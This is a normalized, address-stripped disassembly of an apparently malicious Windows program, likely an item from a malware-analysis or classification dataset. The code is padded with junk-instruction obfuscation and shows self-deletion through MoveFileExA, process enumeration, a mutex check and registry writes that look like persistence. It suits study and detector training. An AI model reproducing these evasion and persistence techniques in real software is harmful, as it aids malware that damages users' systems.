sub_401000
push ebp
mov ebp esp
sub esp 0x734
push ebx
push esi
push edi
push 0x3f
jmp r-xdata
and [ ebp - 0x1ec ] 0x0
pop ecx
nop [ eax ] eax
and [ ebp - 0x184 ] 0x0
jmp r-xdata
push 0x3f
nop [ eax ] eax
and [ ebp - 0x430 ] 0x0
xor eax eax
nop
and [ ebp - 0x2ec ] 0x0
nop [ eax ] eax
lea edi [ ebp - 0x2eb ]
nop
and [ ebp - 0x180 ] 0x0
mov edx edx
[ edi ]
nop [ eax + eax ] eax
stosw [ edi ]
pop ecx
nop [ eax + eax ] eax
push 0x0
nop [ eax ] eax
stosb [ edi ]
nop
xor eax eax
nop
lea edi [ ebp - 0x17f ]
[ edi ]
nop
and [ ebp - 0x1e8 ] 0x0
nop [ eax ] eax
stosw [ edi ]
push ebp
pop ebp
stosb [ edi ]
call sub_406607
nop
pop ecx
nop
push eax
nop [ eax ] eax
call sub_4065d8
nop [ eax ] eax
pop ecx
call sub_411aa0
nop
test eax eax
nop [ eax ] eax
je r-xdata
call sub_411b10
nop
test eax eax
je r-xdata
call sub_40470c
nop
or eax 0xffffffff
nop [ eax ] eax
jmp r-xdata
call sub_40ea10
mov [ ebp - 0x184 ] eax
jmp r-xdata
push esp
pop esp
call sub_40470c
nop [ eax ] eax
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
call sub_405aa9
jmp r-xdata
mov [ ebp - 0x434 ] eax
nop
push 0x100
lea eax [ ebp - 0x2ec ]
nop [ eax ] eax
push 0x0
nop [ eax ] eax
push eax
nop
call sub_406580
nop
add esp 0xc
nop [ eax ] eax
call sub_401cd8
nop
mov [ ebp - 0x1e8 ] eax
nop [ eax ] eax
cmp [ ebp - 0x184 ] 0x0
je r-xdata
push 0x100
push 0x0
nop [ eax + eax ] eax
lea eax [ ebp - 0x2ec ]
mov ebp ebp
push eax
nop [ eax ] eax
call sub_406580
nop
add esp 0xc
nop [ eax ] eax
call sub_401f6d
nop [ eax ] eax
test eax eax
nop
je r-xdata
mov ebp ebp
cmp [ ebp - 0x434 ] 0x0
jmp r-xdata
push rw-data
lea eax [ ebp - 0x2ec ]
nop [ eax + eax ] eax
push eax
call sub_406430
pop ecx
lea eax [ ebp - 0x42c ]
pop ecx
push eax
lea eax [ ebp - 0x30c ]
push eax
lea eax [ ebp - 0x1e4 ]
push eax
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0x184 ]
call sub_403464
lea eax [ ebp - 0x42c ]
add esp 0x14
push eax
lea eax [ ebp - 0x1e4 ]
push eax
lea eax [ ebp - 0x40c ]
push eax
call sub_404ad8
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x42c ]
nop [ eax ] eax
push eax
push esp
pop esp
lea eax [ ebp - 0x30c ]
push eax
lea eax [ ebp - 0x1e4 ]
nop [ eax + eax ] eax
push eax
lea eax [ ebp - 0x40c ]
push eax
nop
push [ ebp - 0x184 ]
jmp r-xdata
jne r-xdata
call sub_40ff00
test eax eax
je r-xdata
cmp [ ebp - 0x1e8 ] 0x0
je r-xdata
call sub_403464
jmp r-xdata
lea eax [ ebp - 0x1e4 ]
push eax
nop [ eax ] eax
lea eax [ ebp - 0x40c ]
push eax
push esi
pop esi
call sub_4043c6
test eax eax
nop [ eax ] eax
pop ecx
pop ecx
nop [ eax + eax ] eax
je r-xdata
cmp [ ebp - 0x1e8 ] 0x0
jne r-xdata
push 0x100
lea eax [ ebp - 0x2ec ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x2ec ]
push 0x4
push 0x0
push eax
call [ MoveFileExA@IAT ]
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
lea eax [ ebp - 0x1e4 ]
push eax
lea eax [ ebp - 0x40c ]
push eax
lea eax [ ebp - 0x2ec ]
push rw-data
push eax
call sub_406520
lea eax [ ebp - 0x42c ]
add esp 0x10
push eax
lea eax [ ebp - 0x40c ]
push eax
push rw-data
lea eax [ ebp - 0x734 ]
push eax
call sub_406520
add esp 0x10
lea eax [ ebp - 0x2ec ]
push eax
lea eax [ ebp - 0x734 ]
push rw-data
push eax
call sub_404db8
lea eax [ ebp - 0x2ec ]
add esp 0xc
push eax
call sub_4052d5
pop ecx
call sub_40fea0
test eax eax
je r-xdata
lea eax [ ebp - 0x42c ]
push eax
lea eax [ ebp - 0x40c ]
push eax
lea eax [ ebp - 0x2ec ]
push rw-data
push eax
call sub_406520
add esp 0x10
lea eax [ ebp - 0x2ec ]
push eax
lea eax [ ebp - 0x30c ]
push eax
lea eax [ ebp - 0x1e4 ]
push eax
lea eax [ ebp - 0x40c ]
push eax
push 0x1
call sub_4113e0
add esp 0x14
mov [ ebp - 0x430 ] eax
cmp [ ebp - 0x430 ] 0x0
jge r-xdata
add esp 0x14
nop [ eax ] eax
lea eax [ ebp - 0x30c ]
push eax
nop [ eax + eax ] eax
lea eax [ ebp - 0x40c ]
push eax
lea eax [ ebp - 0x2ec ]
nop
push rw-data
nop [ eax ] eax
push eax
call sub_406520
nop [ eax + eax ] eax
lea eax [ ebp - 0x2ec ]
add esp 0x10
nop [ eax ] eax
push eax
nop
call sub_40e630
push esp
pop esp
test eax eax
pop ecx
nop [ eax ] eax
jne r-xdata
nop [ eax ] eax
push rw-data
and [ ebp - 0x430 ] 0x0
lea eax [ ebp - 0x1c4 ]
push eax
pop eax
push eax
nop
call sub_40e8d0
nop [ eax ] eax
pop ecx
nop [ eax ] eax
pop ecx
nop [ eax + eax ] eax
lea eax [ ebp - 0x1e4 ]
push ebx
pop ebx
push eax
lea eax [ ebp - 0x40c ]
nop [ eax ] eax
push eax
lea eax [ ebp - 0x2ec ]
nop [ eax ] eax
push rw-data
push eax
call sub_406520
nop [ eax ] eax
add esp 0x10
nop [ eax ] eax
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
call sub_405846
test eax eax
je r-xdata
jmp r-xdata
push [ ebp - 0x1ec ]
call sub_40fd00
pop ecx
push [ ebp - 0x1ec ]
call sub_40fc20
pop ecx
push 0x1
lea eax [ ebp - 0x1e4 ]
push eax
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0x184 ]
call sub_4038f9
add esp 0x10
lea eax [ ebp - 0x2ec ]
push 0x0
push eax
lea eax [ ebp - 0x1e4 ]
push eax
call sub_40f550
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x184 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x42c ]
push eax
nop
lea eax [ ebp - 0x1e4 ]
push eax
lea eax [ ebp - 0x40c ]
nop [ eax ] eax
push eax
nop [ eax + eax ] eax
call sub_404ad8
jmp r-xdata
cmp [ ebp - 0x1ec ] 0x0
nop
je r-xdata
push 0x3e8
call [ Sleep@IAT ]
nop
mov eax [ ebp - 0x430 ]
nop [ eax ] eax
inc eax
mov [ ebp - 0x430 ] eax
cmp [ ebp - 0x430 ] 0x3
jle r-xdata
call sub_40470c
push [ ebp - 0x1ec ]
call sub_40fd00
pop ecx
push [ ebp - 0x1ec ]
call sub_40fc20
pop ecx
xor eax eax
jmp r-xdata
push 0x100
lea eax [ ebp - 0x2ec ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x4
push 0x0
lea eax [ ebp - 0x2ec ]
push eax
call [ MoveFileExA@IAT ]
lea eax [ ebp - 0x1e4 ]
push eax
lea eax [ ebp - 0x40c ]
push eax
lea eax [ ebp - 0x2ec ]
push rw-data
push eax
call sub_406520
lea eax [ ebp - 0x30c ]
add esp 0x10
push eax
lea eax [ ebp - 0x40c ]
push eax
lea eax [ ebp - 0x634 ]
push rw-data
push eax
call sub_406520
add esp 0x10
lea eax [ ebp - 0x2ec ]
push eax
call sub_40e5f0
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x1c4 ]
push rw-data
push eax
call sub_40e8d0
pop ecx
lea eax [ ebp - 0x1e4 ]
pop ecx
push eax
lea eax [ ebp - 0x40c ]
push eax
lea eax [ ebp - 0x2ec ]
push rw-data
push eax
call sub_406520
lea eax [ ebp - 0x2ec ]
add esp 0x10
push eax
lea eax [ ebp - 0x1c4 ]
push eax
call sub_40fb10
pop ecx
mov [ ebp - 0x1ec ] eax
pop ecx
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
add esp 0xc
nop
test eax eax
je r-xdata
push [ ebp - 0x1ec ]
call sub_40fce0
pop ecx
nop
jmp r-xdata
nop [ eax + eax ] eax
jmp r-xdata
push rw-data
lea eax [ ebp - 0x80 ]
push eax
call sub_40e8d0
lea eax [ ebp - 0x80 ]
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x634 ]
push eax
call sub_401871
pop ecx
test eax eax
pop ecx
jne r-xdata
lea eax [ ebp - 0x634 ]
push eax
lea eax [ ebp - 0x2ec ]
push eax
call sub_405553
pop ecx
pop ecx
lea eax [ ebp - 0x42c ]
push eax
lea eax [ ebp - 0x40c ]
push eax
push rw-data
lea eax [ ebp - 0x2ec ]
push eax
call sub_406520
add esp 0x10
lea eax [ ebp - 0x2ec ]
push eax
call sub_4122aa
pop ecx
push [ ebp - 0x1ec ]
call sub_40fce0
pop ecx
jmp r-xdata
lea eax [ ebp - 0x1e4 ]
push eax
nop
lea eax [ ebp - 0x40c ]
push eax
nop [ eax ] eax
lea eax [ ebp - 0x2ec ]
push rw-data
push eax
call sub_406520
mov edx edx
add esp 0x10
nop
lea eax [ ebp - 0x42c ]
nop [ eax ] eax
push eax
nop [ eax + eax ] eax
lea eax [ ebp - 0x40c ]
push eax
lea eax [ ebp - 0x534 ]
nop [ eax + eax ] eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0x2ec ]
nop [ eax ] eax
push eax
push ebp
pop ebp
lea eax [ ebp - 0x1c4 ]
push eax
nop [ eax + eax ] eax
call sub_40fb10
nop [ eax + eax ] eax
mov [ ebp - 0x1ec ] eax
cmp [ ebp - 0x1ec ] 0x0
nop [ eax ] eax
pop ecx
nop [ eax ] eax
pop ecx
nop
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1e4 ]
push eax
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0x184 ]
call sub_4038f9
add esp 0x10
push eax
nop [ eax ] eax
call sub_406520
lea eax [ ebp - 0x2ec ]
add esp 0x10
push eax
pop eax
push eax
nop [ eax ] eax
push rw-data
nop [ eax ] eax
lea eax [ ebp - 0x534 ]
push eax
jmp r-xdata
call sub_404db8
nop [ eax ] eax
add esp 0xc
lea eax [ ebp - 0x2ec ]
nop [ eax ] eax
push eax
push edx
pop edx
call sub_4052d5
nop
lea eax [ ebp - 0x1e4 ]
pop ecx
nop [ eax + eax ] eax
push 0x0
nop [ eax ] eax
push eax
nop [ eax ] eax
lea eax [ ebp - 0x40c ]
nop [ eax ] eax
push eax
nop [ eax ] eax
push [ ebp - 0x184 ]
nop [ eax + eax ] eax
call sub_4038f9
add esp 0x10
push edi
pop edi
test eax eax
nop
je r-xdata
nop
lea eax [ ebp - 0x1e4 ]
push eax
push eax
pop eax
push [ ebp - 0x184 ]
nop [ eax ] eax
call sub_40249d
nop [ eax ] eax
pop ecx
nop [ eax ] eax
pop ecx
sub_401871
push ebp
mov ebp esp
sub esp 0x83c
push ebx
push esi
push edi
mov eax 0x0
nop [ eax ] eax
and [ ebp - 0x104 ] 0x0
nop
lea edi [ ebp - 0x103 ]
nop [ eax ] eax
push 0x3f
nop
pop ecx
mov eax eax
and [ ebp - 0x710 ] 0x0
nop [ eax ] eax
[ edi ]
mov edx edx
push 0x3f
pop ecx
stosw [ edi ]
stosb [ edi ]
nop [ eax ] eax
lea edi [ ebp - 0x70f ]
jmp r-xdata
mov eax 0x0
nop
push 0x3f
nop
and [ ebp - 0x610 ] 0x0
[ edi ]
stosw [ edi ]
pop ecx
nop
stosb [ edi ]
nop [ eax ] eax
push 0x3f
jmp r-xdata
mov eax 0x0
lea edi [ ebp - 0x60f ]
nop [ eax ] eax
and [ ebp - 0x510 ] 0x0
[ edi ]
pop ecx
stosw [ edi ]
nop [ eax + eax ] eax
stosb [ edi ]
nop
xchg ecx eax
mov ecx 0x0
xchg eax ecx
nop [ eax + eax ] eax
lea edi [ ebp - 0x50f ]
and [ ebp - 0x410 ] 0x0
[ edi ]
stosw [ edi ]
nop [ eax ] eax
push 0x3f
jmp r-xdata
pop ecx
nop
stosb [ edi ]
push 0x3f
xchg ecx eax
mov ecx 0x0
xchg eax ecx
nop [ eax ] eax
xchg edi esi
lea esi [ ebp - 0x40f ]
xchg edi esi
and [ ebp - 0x310 ] 0x0
nop [ eax ] eax
[ edi ]
nop [ eax + eax ] eax
stosw [ edi ]
nop [ eax + eax ] eax
pop ecx
jmp r-xdata
stosb [ edi ]
nop
xchg edi ebx
lea ebx [ ebp - 0x30f ]
xchg ebx edi
mov eax 0x0
mov esp esp
and [ ebp - 0x208 ] 0x0
nop
[ edi ]
and [ ebp - 0x204 ] 0x0
push 0x3f
nop
stosw [ edi ]
stosb [ edi ]
mov ebp ebp
xchg edi eax
mov edi 0x0
xchg edi eax
mov ecx ecx
pop ecx
push ecx
pop ecx
lea edi [ ebp - 0x203 ]
[ edi ]
and [ ebp - 0x210 ] 0x0
nop [ eax + eax ] eax
stosw [ edi ]
nop [ eax ] eax
push rw-data
nop [ eax ] eax
and [ ebp - 0x20c ] 0x0
nop [ eax ] eax
stosb [ edi ]
nop
lea eax [ ebp - 0x204 ]
nop
push eax
nop
call sub_40e8d0
jmp r-xdata
pop ecx
nop
lea eax [ ebp - 0x204 ]
nop
pop ecx
nop
push rw-data
push eax
nop [ eax ] eax
call sub_4066e3
mov [ ebp - 0x208 ] eax
nop [ eax ] eax
pop ecx
nop
pop ecx
nop [ eax + eax ] eax
push 0x0
mov esp esp
push 0x2
nop [ eax ] eax
call CreateToolhelp32Snapshot
mov edx edx
xchg ecx eax
mov [ ebp - 0x4 ] ecx
xchg ecx eax
nop
cmp [ ebp - 0x4 ] 0xffffffff
nop [ eax + eax ] eax
je r-xdata
push ecx
pop ecx
push [ ebp - 0x208 ]
mov esp esp
xchg eax edx
movsx edx [ ebp - 0x20c ]
xchg eax edx
nop [ eax ] eax
shl eax 0x8
lea eax [ ebp + eax - 0x710 ]
nop [ eax + eax ] eax
push eax
mov ebp ebp
call sub_406430
mov esp esp
mov ax [ ebp - 0x20c ]
pop ecx
nop
pop ecx
nop [ eax ] eax
push rw-data
nop [ eax ] eax
add ax 0x1
nop [ eax ] eax
mov [ ebp - 0x20c ] ax
push 0x0
nop
call sub_4066e3
nop [ eax + eax ] eax
mov [ ebp - 0x208 ] eax
nop [ eax ] eax
pop ecx
nop [ eax + eax ] eax
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
xchg esi ecx
mov esi esi
xchg ecx esi
call [ CloseHandle@IAT ]
xchg eax edx
mov edx 0x0
xchg edx eax
nop
jmp sub_401cd3
nop [ eax + eax ] eax
and [ ebp - 0x210 ] 0x0
nop [ eax ] eax
cmp [ ebp - 0x208 ] 0x0
je r-xdata
nop [ eax + eax ] eax
mov [ ebp - 0x838 ] 0x128
lea eax [ ebp - 0x838 ]
push eax
jmp r-xdata
push [ ebp - 0x4 ]
call Process32First
nop [ eax ] eax
mov [ ebp - 0x83c ] eax
nop [ eax + eax ] eax
mov ax [ ebp - 0x210 ]
nop [ eax + eax ] eax
add ax 0x1
nop
mov [ ebp - 0x210 ] ax
jmp r-xdata
jmp r-xdata
movsx eax [ ebp - 0x210 ]
nop [ eax ] eax
movsx ecx [ ebp - 0x20c ]
nop
cmp eax ecx
nop
jge r-xdata
lea eax [ ebp - 0x814 ]
nop [ eax ] eax
push eax
mov edx edx
lea eax [ ebp - 0x104 ]
jmp r-xdata
push eax
call sub_406430
nop
xchg edi eax
lea edi [ ebp - 0x104 ]
xchg eax edi
xchg esi ecx
mov esi esi
xchg ecx esi
pop ecx
nop [ eax + eax ] eax
pop ecx
nop
push eax
movsx eax [ ebp - 0x210 ]
nop [ eax ] eax
shl eax 0x8
jmp r-xdata
lea eax [ ebp + eax - 0x710 ]
mov ebp ebp
push eax
call sub_40cbf0
nop
test eax eax
nop [ eax + eax ] eax
pop ecx
nop [ eax ] eax
pop ecx
nop
jne r-xdata
mov [ ebp - 0x838 ] 0x128
push ebp
pop ebp
lea eax [ ebp - 0x838 ]
nop
push eax
jmp r-xdata
nop
push [ ebp + 0xc ]
nop [ eax ] eax
push [ ebp + 0x8 ]
push [ ebp - 0x830 ]
nop
call sub_40f610
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
xchg edx eax
test edx edx
xchg eax edx
je r-xdata
push [ ebp - 0x4 ]
nop [ eax ] eax
call Process32Next
xchg eax edi
mov [ ebp - 0x83c ] edi
xchg edi eax
nop
jmp r-xdata
mov eax 0x0
push ebp
pop ebp
jmp sub_401cd3
push ebx
pop ebx
push [ ebp - 0x4 ]
nop
call [ CloseHandle@IAT ]
nop [ eax ] eax
push 0x64
nop
call [ Sleep@IAT ]
jmp r-xdata
cmp [ ebp - 0x83c ] 0x0
nop [ eax ] eax
je r-xdata
push 0x1
nop
pop eax
jmp sub_401cd3
sub_401cd8
push ebp
mov ebp esp
sub esp 0x84
push ebx
push esi
push edi
push rw-data
push ebx
pop ebx
lea eax [ ebp - 0x84 ]
push eax
push ecx
pop ecx
call sub_40e8d0
nop
lea eax [ ebp - 0x84 ]
pop ecx
nop [ eax + eax ] eax
pop ecx
push rw-data
nop [ eax + eax ] eax
push eax
nop [ eax ] eax
call sub_4066e3
pop ecx
mov [ ebp - 0x4 ] eax
nop [ eax ] eax
pop ecx
call sub_40ffc0
test eax eax
jne r-xdata
nop
push [ ebp - 0x4 ]
nop
call sub_40fc80
nop [ eax ] eax
pop ecx
nop
push rw-data
push 0x0
call sub_4066e3
nop
xchg edx eax
mov [ ebp - 0x4 ] edx
xchg edx eax
pop ecx
pop ecx
nop
jmp r-xdata
mov eax 0x0
nop [ eax + eax ] eax
jmp r-xdata
call sub_40fea0
nop
test eax eax
nop [ eax + eax ] eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
nop [ eax ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
nop
call sub_405846
test eax eax
jne r-xdata
nop [ eax ] eax
call sub_405aa9
test eax eax
mov edx edx
je r-xdata
push 0x1
pop eax
nop [ eax ] eax
jmp r-xdata
sub_401f01
pushad
sub [ 0xffffffffb8ae2b06 ] 0xf
salc
push ecx
xchg esi ebx
mov esp 0xa7478b44
xchg esp eax
push ecx
xchg edi eax
cmp [ edx + ecx - 0x73 ] ebx
xchg esi eax
fstp st2
xchg edi eax
push esp
out 0x63 al
push eax
cmpsb [ esi ] [ edi ]
pop ebx
xchg ebx eax
cmp dh al
and eax 0x44a2b4ad
xchg ebp eax
dec eax
leave
das
pop edi
adc dl [ edi - 0x6177e794 ]
outsd
aad 0x75
push esi
mov bh 0xfc
das
pop es
and eax 0x9ef51dd0
inc edx
int3
sub_401f6d
push ebp
mov ebp esp
sub esp 0xa28
push ebx
push esi
push edi
push rw-data
and [ ebp - 0x724 ] 0x0
nop
and [ ebp - 0x928 ] 0x0
nop
lea eax [ ebp - 0x320 ]
mov ebp ebp
push eax
call sub_40e8d0
nop [ eax ] eax
lea eax [ ebp - 0x320 ]
nop [ eax ] eax
pop ecx
jmp r-xdata
pop ecx
push eax
nop [ eax ] eax
push 0x0
nop [ eax ] eax
push 0x1f0001
nop [ eax ] eax
call [ OpenMutexA@IAT ]
mov [ ebp - 0x928 ] eax
nop
cmp [ ebp - 0x928 ] 0x0
nop [ eax ] eax
je r-xdata
push 0x100
lea eax [ ebp - 0x824 ]
push eax
call [ GetSystemDirectoryA@IAT ]
mov ebx ebx
push 0x0
nop [ eax + eax ] eax
lea eax [ ebp - 0x520 ]
push eax
pop eax
push 0x1a
nop
push eax
nop
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
and [ ebp - 0x724 ] 0x0
mov ebp ebp
nop [ eax ] eax
push 0x1
pop eax
nop [ eax ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
nop
mov eax [ ebp - 0x724 ]
nop
push [ eax * 4 + rw-data ]
push edi
pop edi
lea eax [ ebp - 0x720 ]
nop [ eax + eax ] eax
push eax
call sub_40e8d0
push ebx
pop ebx
lea eax [ ebp - 0x720 ]
nop [ eax ] eax
pop ecx
nop
pop ecx
push rw-data
push eax
nop [ eax + eax ] eax
call sub_4066e3
push ebp
pop ebp
pop ecx
nop
pop ecx
nop
push rw-data
nop [ eax + eax ] eax
push 0x0
call sub_4066e3
nop
pop ecx
push ebp
pop ebp
pop ecx
push ecx
pop ecx
push eax
nop [ eax + eax ] eax
lea eax [ ebp - 0x320 ]
nop [ eax ] eax
push eax
nop [ eax ] eax
call sub_406430
lea eax [ ebp - 0x320 ]
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
pop ecx
mov edi edi
push eax
nop [ eax ] eax
lea eax [ ebp - 0x924 ]
push rw-data
nop [ eax + eax ] eax
push eax
nop [ eax ] eax
call sub_406520
mov eax [ ebp - 0x724 ]
nop
add esp 0xc
nop [ eax ] eax
push [ eax * 4 + rw-data ]
push esi
pop esi
lea eax [ ebp - 0x720 ]
push eax
call sub_40e8d0
nop
pop ecx
pop ecx
nop [ eax ] eax
lea eax [ ebp - 0x720 ]
push rw-data
nop [ eax ] eax
push eax
call sub_4066e3
nop [ eax + eax ] eax
pop ecx
pop ecx
nop [ eax + eax ] eax
push eax
nop [ eax ] eax
lea eax [ ebp - 0x20 ]
push edx
pop edx
push eax
mov eax eax
call sub_406430
pop ecx
pop ecx
nop
push rw-data
push edx
pop edx
push 0x0
jmp r-xdata
call sub_4066e3
pop ecx
nop
pop ecx
nop [ eax ] eax
push rw-data
push 0x0
nop [ eax ] eax
call sub_4066e3
mov esp esp
pop ecx
nop [ eax ] eax
pop ecx
jmp r-xdata
push eax
nop [ eax + eax ] eax
lea eax [ ebp - 0x220 ]
push eax
nop
call sub_406430
pop ecx
nop [ eax ] eax
pop ecx
nop
push rw-data
push 0x0
nop
call sub_4066e3
nop
pop ecx
jmp r-xdata
pop ecx
push eax
nop
lea eax [ ebp - 0xa28 ]
nop [ eax ] eax
push eax
nop [ eax ] eax
call sub_406430
nop [ eax + eax ] eax
pop ecx
nop
pop ecx
nop [ eax ] eax
push rw-data
nop [ eax + eax ] eax
push 0x0
nop [ eax + eax ] eax
call sub_4066e3
nop
pop ecx
nop
pop ecx
nop [ eax + eax ] eax
push eax
lea eax [ ebp - 0x420 ]
nop
push eax
call sub_406430
pop ecx
nop [ eax + eax ] eax
lea eax [ ebp - 0x924 ]
mov edx edx
pop ecx
nop [ eax ] eax
push 0x0
nop
push eax
nop [ eax + eax ] eax
call sub_40f750
nop
pop ecx
nop [ eax ] eax
test eax eax
nop [ eax ] eax
pop ecx
nop [ eax + eax ] eax
jne r-xdata
movsx eax [ ebp - 0xa28 ]
mov ebx ebx
cmp eax 0x5c
jne r-xdata
nop [ eax + eax ] eax
push 0x100
nop [ eax + eax ] eax
lea eax [ ebp - 0x320 ]
nop
push eax
nop [ eax + eax ] eax
lea eax [ ebp - 0x20 ]
push ebp
pop ebp
push eax
lea eax [ ebp - 0x420 ]
push esp
pop esp
push eax
nop [ eax ] eax
push 0x80000002
nop
call sub_40eb00
nop [ eax ] eax
add esp 0x14
test eax eax
nop [ eax ] eax
je r-xdata
lea eax [ ebp - 0x824 ]
nop
push eax
lea eax [ ebp - 0x120 ]
jmp r-xdata
nop [ eax ] eax
lea eax [ ebp - 0x320 ]
mov ecx ecx
push eax
lea eax [ ebp - 0x824 ]
jmp r-xdata
push 0x100
nop
lea eax [ ebp - 0x320 ]
push eax
lea eax [ ebp - 0x20 ]
nop [ eax ] eax
push eax
nop
lea eax [ ebp - 0x420 ]
nop
push eax
nop [ eax ] eax
push 0x80000001
call sub_40eb00
nop
add esp 0x14
jmp r-xdata
nop
push eax
nop
call sub_406430
nop
pop ecx
pop ecx
nop [ eax + eax ] eax
push eax
push rw-data
jmp r-xdata
test eax eax
nop [ eax ] eax
jne r-xdata
nop [ eax ] eax
push 0x1
nop [ eax + eax ] eax
pop eax
jmp r-xdata
lea eax [ ebp - 0x120 ]
push eax
nop [ eax ] eax
call sub_406520
nop [ eax ] eax
add esp 0x10
jmp r-xdata
movsx eax [ ebp - 0x220 ]
cmp eax 0x5c
nop [ eax ] eax
jne r-xdata
nop
lea eax [ ebp - 0x20 ]
push 0x0
push eax
call sub_40f4d0
test eax eax
pop ecx
pop ecx
nop
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
nop [ eax ] eax
lea eax [ ebp - 0x120 ]
nop [ eax + eax ] eax
push eax
mov edx edx
push rw-data
mov ebp ebp
lea eax [ ebp - 0x320 ]
push eax
nop
call sub_406520
lea eax [ ebp - 0x320 ]
nop [ eax ] eax
add esp 0x10
push eax
nop [ eax + eax ] eax
call sub_40e5f0
mov ecx ecx
pop ecx
nop [ eax ] eax
test eax eax
push eax
pop eax
je r-xdata
lea eax [ ebp - 0x520 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
call sub_406430
pop ecx
pop ecx
nop [ eax + eax ] eax
lea eax [ ebp - 0x320 ]
nop [ eax ] eax
push eax
mov edx edx
lea eax [ ebp - 0x520 ]
nop [ eax + eax ] eax
push eax
nop [ eax + eax ] eax
push rw-data
lea eax [ ebp - 0x120 ]
push eax
call sub_406520
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x724 ]
inc eax
mov [ ebp - 0x724 ] eax
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
push rw-data
lea eax [ ebp - 0x320 ]
push eax
call sub_406520
add esp 0x10
lea eax [ ebp - 0x320 ]
push eax
call sub_40e5f0
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x724 ]
cmp [ eax * 4 + rw-data ] 0x0
nop
je r-xdata
sub_40249d
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
and [ ebp - 0x4 ] 0x0
push ebp
pop ebp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
nop [ eax ] eax
call sub_4026d8
push ebp
pop ebp
pop ecx
nop [ eax + eax ] eax
pop ecx
nop [ eax ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
nop
call sub_4029c4
mov [ ebp - 0x4 ] eax
nop
pop ecx
nop
pop ecx
nop [ eax ] eax
mov eax [ ebp - 0x4 ]
nop [ eax ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4026d8
push ebp
mov ebp esp
sub esp 0x424
push ebx
push esi
push edi
and [ ebp - 0x324 ] 0x0
nop [ eax ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x324 ] 0x0
mov eax eax
jmp r-xdata
jmp r-xdata
nop [ eax + eax ] eax
mov eax [ ebp - 0x324 ]
nop [ eax ] eax
push [ eax * 4 + rw-data ]
lea eax [ ebp - 0x320 ]
nop [ eax + eax ] eax
push eax
nop [ eax ] eax
call sub_40e8d0
pop ecx
lea eax [ ebp - 0x320 ]
nop
pop ecx
nop
push rw-data
push eax
nop
call sub_4066e3
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
pop ecx
pop ecx
nop [ eax ] eax
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_406430
nop [ eax + eax ] eax
pop ecx
mov esp esp
pop ecx
nop [ eax ] eax
push rw-data
nop
push 0x0
nop [ eax ] eax
call sub_4066e3
pop ecx
pop ecx
push eax
nop [ eax ] eax
lea eax [ ebp - 0x120 ]
push eax
nop
call sub_406430
lea eax [ ebp - 0x120 ]
nop [ eax ] eax
pop ecx
mov ecx ecx
pop ecx
nop [ eax + eax ] eax
push eax
push rw-data
xchg ebx eax
lea ebx [ ebp - 0x424 ]
xchg ebx eax
nop [ eax + eax ] eax
push eax
call sub_406520
nop [ eax + eax ] eax
lea eax [ ebp - 0x20 ]
inc esp
add esp 0x1
add esp 0x2
inc esp
add esp 0x3
add esp 0x2
add esp 0x1
add esp 0x1
nop [ eax ] eax
push eax
push [ ebp + 0xc ]
nop
call sub_406790
nop
pop ecx
jmp r-xdata
test eax eax
nop
pop ecx
mov edx edx
je r-xdata
mov eax [ ebp - 0x324 ]
nop
inc eax
nop [ eax ] eax
mov [ ebp - 0x324 ] eax
nop [ eax + eax ] eax
jmp r-xdata
nop [ eax ] eax
lea eax [ ebp - 0x424 ]
push eax
call sub_40f920
pop ecx
mov eax [ ebp - 0x324 ]
nop [ eax ] eax
cmp [ eax * 4 + rw-data ] 0x0
nop
je r-xdata
sub_4029c4
push ebp
mov ebp esp
sub esp 0x8c8
push ebx
push esi
push edi
push 0x1
nop [ eax + eax ] eax
and [ ebp - 0x548 ] 0x0
nop
push 0x1a
and [ ebp - 0x4 ] 0x0
nop [ eax ] eax
lea eax [ ebp - 0x748 ]
push eax
nop [ eax + eax ] eax
push 0x0
push ebx
pop ebx
call [ SHGetSpecialFolderPathA@IAT ]
nop [ eax ] eax
lea eax [ ebp - 0x648 ]
push 0x100
jmp r-xdata
push eax
nop
call [ GetSystemDirectoryA@IAT ]
and [ ebp - 0x548 ] 0x0
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x548 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ eax * 4 + rw-data ]
lea eax [ ebp - 0x244 ]
nop [ eax + eax ] eax
push eax
jmp r-xdata
call sub_40e8d0
nop
lea eax [ ebp - 0x244 ]
nop [ eax ] eax
pop ecx
pop ecx
nop [ eax ] eax
push rw-data
push eax
